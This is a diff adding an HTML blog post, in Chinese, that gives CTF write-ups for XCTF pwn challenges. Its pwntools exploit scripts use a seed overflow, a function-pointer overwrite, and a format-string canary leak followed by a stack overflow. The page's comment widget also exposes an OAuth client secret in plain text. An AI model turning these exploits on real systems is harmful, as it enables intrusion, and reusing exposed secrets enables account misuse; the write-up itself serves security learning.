@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    攻防世界进阶区 |
+    
+    summerN&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/atom.xml" title="summerN's blog" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-攻防世界进阶区" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      攻防世界进阶区
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/01/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6%E5%8C%BA/" class="article-date">
+  <time datetime="2020-01-13T15:09:26.763Z" itemprop="datePublished">2020-01-13</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        <h1 id="攻防世界进阶区"><a href="#攻防世界进阶区" class="headerlink" title="攻防世界进阶区"></a>攻防世界进阶区</h1><a id="more"></a>
+
+<h2 id="1-dice-game"><a href="#1-dice-game" class="headerlink" title="1. dice _ game"></a>1. dice _ game</h2><p>同新手区的那个随机数问题</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./dice_game'</span></span><br><span class="line">libc_name = <span class="string">'./libc.so.6'</span></span><br><span class="line">ip = <span class="string">'111.198.29.45'</span></span><br><span class="line">port = <span class="string">'43605'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"libc.so.6"</span>)</span><br><span class="line">p = remote(ip,port)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Welcome, let me know your name: "</span>)</span><br><span class="line">payload = <span class="string">"a"</span> * (<span class="number">0x40</span>) + p64(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">"Give me the point(1~6): "</span>,str(libc.rand()%<span class="number">6</span> + <span class="number">1</span>))</span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-forgot"><a href="#2-forgot" class="headerlink" title="2.forgot"></a>2.forgot</h2><p>使用@字符绕过下面的嵌套着swich语句的for循环</p>
+<p>使得v14一直为1</p>
+<p>从而使后面的调用函数的地址一直是v3的值</p>
+<p>我们只需栈溢出覆盖v3的值为危险函数地址就好</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./1'</span></span><br><span class="line">libc_name = <span class="string">''</span></span><br><span class="line">ip = <span class="string">'111.198.29.45'</span></span><br><span class="line">port = <span class="string">'59557'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x80486cc</span></span><br><span class="line">payload = <span class="string">"@"</span> * <span class="number">32</span> + p32(system)</span><br><span class="line">payload1 = <span class="string">"summerN"</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"a"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>,payload)</span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-warmup"><a href="#3-warmup" class="headerlink" title="3.warmup"></a>3.warmup</h2><h5 id="先看一下sprintf"><a href="#先看一下sprintf" class="headerlink" title="先看一下sprintf()"></a>先看一下sprintf()</h5><p>sprintf指的是字符串格式化命令，函数声明为 int sprintf(char *string, char *format<br>[,argument,…]);，主要功能是把格式化的数据写入某个字符串中，即发送格式化输出到 string 所指向的字符串。sprintf<br>是个<a href="https://baike.baidu.com/item/变参/9844833" target="_blank" rel="noopener">变参</a>函数。使用sprintf 对于写入buffer的字符数是没有限制的，这就存在了buffer溢出的可能性。解决这个问题，可以考虑使用 <a href="https://baike.baidu.com/item/snprintf" target="_blank" rel="noopener">snprintf</a>函数，该函数可对写入字符数做出限制。</p>
+<p>题目直接通过sprintf函数泄露出了危险函数地址</p>
+<p>exp:</p>
+<h2 id="4-Mary-Morton"><a href="#4-Mary-Morton" class="headerlink" title="4.Mary_Morton"></a>4.Mary_Morton</h2><p>步骤：</p>
+<p>1.通过格式化字符串漏洞泄露cannary</p>
+<p>2.绕过cannary执行危险函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./1'</span></span><br><span class="line">libc_name = <span class="string">''</span></span><br><span class="line">ip = <span class="string">'111.198.29.45'</span></span><br><span class="line">port = <span class="string">'57071'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#p=process(file_name)</span></span><br><span class="line">p=remote(ip,port)</span><br><span class="line">alarm_add = <span class="number">0x4008DA</span></span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line">offset1 = offset + (<span class="number">0x90</span><span class="number">-8</span>)/<span class="number">8</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">"3. Exit the battle \n"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">payload = <span class="string">"%23$p"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">cann = int(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> cann</span><br><span class="line">p.recvuntil(<span class="string">"3. Exit the battle \n"</span>)</span><br><span class="line">payload1 = <span class="string">'a'</span>*(<span class="number">0x88</span>) + p64(cann) + p64(<span class="number">1</span>) + p64(<span class="number">0x4008DA</span>)  <span class="comment">#p64里面不能有字符串</span></span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"><span class="comment">#p.recvline()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/01/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6%E5%8C%BA/" data-id="ck5cl2wl70000h8lu1lt2fnay"
+         class="article-share-link">Share</a>
+      
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+    
+      <a href="/2020/01/12/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="article-nav-link">
+        <strong class="article-nav-caption">Olde posts</strong>
+        <div class="article-nav-title">php伪协议</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: '665e1db541e975225bc6',
+      clientSecret: '525f3534fe6005375cf8c02330ed09a2b7aab7d5',
+      repo: 'talk',
+      owner: 'summerN',
+      admin: ['summerN'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 summerN&#39;s blog</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+
+<aside class="sidebar sidebar-specter">
+  
+    <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="summerN&#39;s blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/gallery">Gallery</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+  </aside>
+  
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
